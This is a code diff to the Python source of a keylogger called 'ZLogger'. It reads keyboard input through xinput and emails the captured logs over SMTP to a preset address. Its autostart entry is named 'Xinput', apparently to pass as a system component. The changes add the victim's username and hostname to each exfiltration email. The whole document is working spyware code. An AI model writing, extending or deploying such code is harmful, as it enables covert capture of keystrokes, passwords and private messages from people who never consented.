@@ -2,6 +2,8 @@
 
 import smtplib, re, os, stat, config
 from shutil import copyfile
+from getpass import getuser
+from socket import gethostname
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEText import MIMEText
 from time import sleep
@@ -22,9 +24,14 @@ Name=Xinput
 """
 
 def send_mail(subject, content):
+	body = "\n** ZLogger **"
+	body = body + "\nThis message is sent from :"
+	body = body + sysinfo()
+	body = body + "\n---------------------------\n\n"
+	body = body + content
 	msg = MIMEMultipart()
 	msg['Subject'] = subject
-	msg.attach(MIMEText(content))
+	msg.attach(MIMEText(body))
 	mailer = smtplib.SMTP(EMAIL_SERVER, 587)
 	
 	mailer.starttls()
@@ -33,6 +40,8 @@ def send_mail(subject, content):
 	mailer.sendmail(config.EMAIL, config.EMAIL, msg.as_string())
 	mailer.close()
 
+def sysinfo():
+	return "\nUser : " + getuser() + "\nHostname : " + gethostname()
 
 def start_logging(log_file):
 	devices = check_output("xinput list | grep AT", shell=True)
